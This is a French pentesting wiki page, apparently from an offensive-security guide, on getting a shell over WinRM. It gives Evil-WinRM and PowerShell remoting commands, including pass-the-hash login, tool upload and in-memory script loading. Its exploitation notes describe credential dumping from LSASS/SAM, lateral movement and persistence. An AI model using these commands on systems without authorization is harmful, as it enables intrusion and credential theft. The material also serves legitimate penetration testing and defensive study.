---
order: 3
title: "Exécution de commandes : obtenir un shell via WinRM"
description: "Une fois authentifié, WinRM donne l'exécution de commandes à distance via PowerShell Remoting : Evil-WinRM et le PowerShell natif (Enter-PSSession/Invoke-Command) ouvrent une session interactive sur l'hôte, typiquement en tant qu'administrateur. De là, un attaquant exécute des commandes, téléverse des outils, charge des scripts en mémoire et extrait des identifiants, faisant de WinRM un point d'appui complet."
keywords:
  - command execution
  - evil-winrm
  - enter-pssession
  - invoke-command
  - powershell remoting
---

# Exécution de commandes

Le but de WinRM est l'administration à distance, donc un accès authentifié est une exécution de commandes à distance. Le client favorable à l'attaquant est Evil-WinRM, qui ouvre une session PowerShell interactive et ajoute des commodités (téléversement/téléchargement de fichiers, chargement en mémoire de scripts et d'assemblages .NET) ; l'outillage natif de Windows (`Enter-PSSession`, `Invoke-Command`) fait de même depuis un hôte d'attaque Windows. Parce que l'accès WinRM est généralement administratif, la session est un point d'appui privilégié : exécuter des commandes, déposer des outils, charger des scripts offensifs en mémoire pour éviter de toucher le disque, et extraire des identifiants pour poursuivre le mouvement latéral.

```bash
# interactive shell (password or hash)
evil-winrm -i <target> -u administrator -H <nthash>
#   *Evil-WinRM* PS> whoami; upload tool.exe; download C:\loot\file
#   *Evil-WinRM* PS> Invoke-Command -ScriptBlock { ... }    # in-memory
# native PowerShell remoting from a Windows host
Enter-PSSession -ComputerName <target> -Credential <cred>
Invoke-Command -ComputerName <target> -Credential <cred> -ScriptBlock { whoami }
```

## Notes d'exploitation

- La session est typiquement admin (l'accès WinRM l'exige, ou l'appartenance à Remote Management Users), donc l'exécution de commandes est un point d'appui privilégié ; confirmez avec `whoami /groups` et passez à l'extraction d'identifiants et à la persistance.
- Le chargement en mémoire d'Evil-WinRM (`Invoke-Binary`, chargement de scripts) exécute l'outillage sans écrire sur le disque, réduisant les artefacts ; utilisez-le pour les scripts et assemblages offensifs.
- WinRM est journalisé (journaux d'événements PowerShell et WSMan) ; il est opérationnellement plus discret que certaines méthodes d'exécution mais pas invisible, donc attendez-vous à une journalisation des sessions et des script-blocks.
- Depuis le shell, pivotez comme d'habitude : extrayez LSASS/SAM pour plus de hashes (alimentant davantage de [pass-the-hash](authentication.md) vers d'autres hôtes), lisez des fichiers et établissez la persistance.

## Outils

- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [PowerShell Remoting](https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands)

## Références

- [HackTricks: WinRM execution](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm)
- [MS-WSMV](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsmv/)
